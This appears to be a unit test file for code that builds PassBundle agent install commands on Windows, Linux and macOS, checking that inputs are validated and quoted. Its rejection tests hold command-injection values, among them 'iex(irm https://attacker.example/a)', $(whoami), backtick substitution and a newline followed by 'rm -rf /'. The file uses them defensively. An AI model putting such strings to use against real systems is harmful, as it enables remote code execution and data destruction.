import { INSTALL_PLATFORMS, installCommand, installSteps, shellLiteral } from "./install-command";

const script = "Install-PassBundle.ps1";
const token = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJ0123-_6";

describe("installCommand", () => {
  it("quotes the server and the token", () => {
    expect(installCommand(script, "https://vault.example.com/", token)).toBe(
      `.\\Install-PassBundle.ps1 -ServerUrl 'https://vault.example.com' -EnrollmentToken '${token}'`,
    );
  });

  it("carries the join secret and the organization's key fingerprint, checked and quoted", () => {
    const parts = { secret: token.replace("a", "s"), fingerprint: token.replace("a", "f") };
    expect(installCommand(script, "https://vault.example.com", token, parts)).toBe(
      `.\\Install-PassBundle.ps1 -ServerUrl 'https://vault.example.com' -EnrollmentToken '${token}' -JoinSecret '${parts.secret}' -OrgKey '${parts.fingerprint}'`,
    );
    expect(
      installCommand(script, "https://vault.example.com", token, { ...parts, secret: "x'; calc" }),
    ).toBeNull();
    expect(
      installCommand(script, "https://vault.example.com", token, { ...parts, fingerprint: "" }),
    ).toBeNull();
  });

  it("takes a port, a path, and an IPv6 address", () => {
    expect(installCommand(script, "https://127.0.0.1:8443/vault", token)).toContain(
      "-ServerUrl 'https://127.0.0.1:8443/vault'",
    );
    expect(installCommand(script, "https://[::1]:8443", token)).toContain(
      "-ServerUrl 'https://[::1]:8443'",
    );
  });

  it.each([
    "x; iex(irm https://attacker.example/a)",
    `${token.slice(0, 42)}'`,
    `${token} `,
    `${token}$(whoami)`,
    token.slice(0, 42),
    `${token}A`,
    "",
  ])("refuses a token that isn't one: %p", (bad) => {
    expect(installCommand(script, "https://vault.example.com", bad)).toBeNull();
  });

  it.each([
    "http://vault.example.com",
    "https://vault.example.com/'; calc; '",
    "https://vault.example.com/’; calc; ‘",
    "https://vault.example.com/a b",
    "https://vault.example.com/?x=1",
    "https://vault.example.com/$(whoami)",
    "https://",
  ])("refuses a server address that isn't plain HTTPS: %p", (bad) => {
    expect(installCommand(script, bad, token)).toBeNull();
  });

  it("refuses a script name that isn't one", () => {
    expect(installCommand("x; calc; .ps1", "https://vault.example.com", token)).toBeNull();
    expect(installCommand("Install.exe", "https://vault.example.com", token)).toBeNull();
  });
});

describe("installSteps", () => {
  const scripts = {
    windows: "Install-PassBundle.ps1",
    unix: "install-passbundle.sh",
    macProfile: "PassBundle.mobileconfig",
  };
  const server = "https://vault.example.com/";
  const parts = { secret: token.replace("a", "s"), fingerprint: token.replace("a", "f") };

  it("on Windows, is the PowerShell command", () => {
    expect(installSteps("windows", scripts, server, token, parts)).toEqual({
      command: installCommand(scripts.windows, server, token, parts),
    });
    expect(installSteps("windows", scripts, server, token)).toEqual({
      command: `.\\Install-PassBundle.ps1 -ServerUrl 'https://vault.example.com' -EnrollmentToken '${token}'`,
    });
  });

  it("on Linux, runs the shell script with the same server, token, join secret, and fingerprint", () => {
    expect(installSteps("linux", scripts, server, token, parts)).toEqual({
      command: `./install-passbundle.sh --server-url 'https://vault.example.com' --enrollment-token '${token}' --join-secret '${parts.secret}' --org-key '${parts.fingerprint}'`,
    });
    expect(installSteps("linux", scripts, server, token)).toEqual({
      command: `./install-passbundle.sh --server-url 'https://vault.example.com' --enrollment-token '${token}'`,
    });
  });

  it("on a Mac, writes the MDM profile with them, and installs the app with nothing secret", () => {
    expect(installSteps("macos", scripts, server, token, parts)).toEqual({
      command: `./make-profile.sh --server-url 'https://vault.example.com' --enrollment-token '${token}' --join-secret '${parts.secret}' --org-key '${parts.fingerprint}' > PassBundle.mobileconfig`,
      app: "./install-passbundle.sh",
    });
    expect(installSteps("macos", scripts, server, token)?.command).toBe(
      `./make-profile.sh --server-url 'https://vault.example.com' --enrollment-token '${token}' > PassBundle.mobileconfig`,
    );
  });

  it("takes a port and a path everywhere", () => {
    for (const platform of INSTALL_PLATFORMS) {
      expect(
        installSteps(platform, scripts, "https://127.0.0.1:8443/vault", token, parts)?.command,
      ).toContain("127.0.0.1:8443/vault'");
    }
  });

  it("refuses an IPv6 address on a Mac and Linux, whose scripts would refuse it, but not on Windows", () => {
    expect(installSteps("windows", scripts, "https://[::1]:8443", token)).not.toBeNull();
    expect(installSteps("macos", scripts, "https://[::1]:8443", token)).toBeNull();
    expect(installSteps("linux", scripts, "https://[::1]:8443", token)).toBeNull();
  });

  describe.each(INSTALL_PLATFORMS)("on %s", (platform) => {
    it.each([
      "x; iex(irm https://attacker.example/a)",
      `${token.slice(0, 42)}'`,
      `${token.slice(0, 40)}'\\''`,
      `${token} `,
      `${token}$(whoami)`,
      "`whoami`".padEnd(43, "a"),
      `${token.slice(0, 42)}\n`,
      token.slice(0, 42),
      `${token}A`,
      "",
    ])("refuses a token that isn't one: %p", (bad) => {
      expect(installSteps(platform, scripts, server, bad)).toBeNull();
      expect(installSteps(platform, scripts, server, token, { ...parts, secret: bad })).toBeNull();
      expect(
        installSteps(platform, scripts, server, token, { ...parts, fingerprint: bad }),
      ).toBeNull();
    });

    it.each([
      "http://vault.example.com",
      "https://vault.example.com/'; calc; '",
      "https://vault.example.com/’; calc; ‘",
      "https://vault.example.com/a b",
      "https://vault.example.com/?x=1",
      "https://vault.example.com/$(whoami)",
      "https://vault.example.com/`whoami`",
      "https://vault.example.com/\nrm -rf /",
      "https://vault.example.com/a;b",
      "https://vault.example.com/a&b",
      "https://vault.example.com/a|b",
      "https://vault.example.com/a>b",
      "https://",
    ])("refuses a server address that isn't plain HTTPS: %p", (bad) => {
      expect(installSteps(platform, scripts, bad, token)).toBeNull();
    });
  });

  it("refuses script and profile names that aren't ones", () => {
    for (const unix of ["x; calc; .sh", "install.ps1", "../install.sh", "a b.sh"]) {
      expect(installSteps("linux", { ...scripts, unix }, server, token)).toBeNull();
      expect(installSteps("macos", { ...scripts, unix }, server, token)).toBeNull();
    }
    for (const macProfile of ["x; calc.mobileconfig", "PassBundle.xml", "a b.mobileconfig"]) {
      expect(installSteps("macos", { ...scripts, macProfile }, server, token)).toBeNull();
    }
    expect(
      installSteps("windows", { ...scripts, windows: "Install.exe" }, server, token),
    ).toBeNull();
  });
});

describe("shellLiteral", () => {
  it("quotes anything so the shell expands nothing", () => {
    expect(shellLiteral("plain")).toBe("'plain'");
    expect(shellLiteral('$(whoami) `id` \\ " ;')).toBe("'$(whoami) `id` \\ \" ;'");
    expect(shellLiteral("it's")).toBe("'it'\\''s'");
  });
});
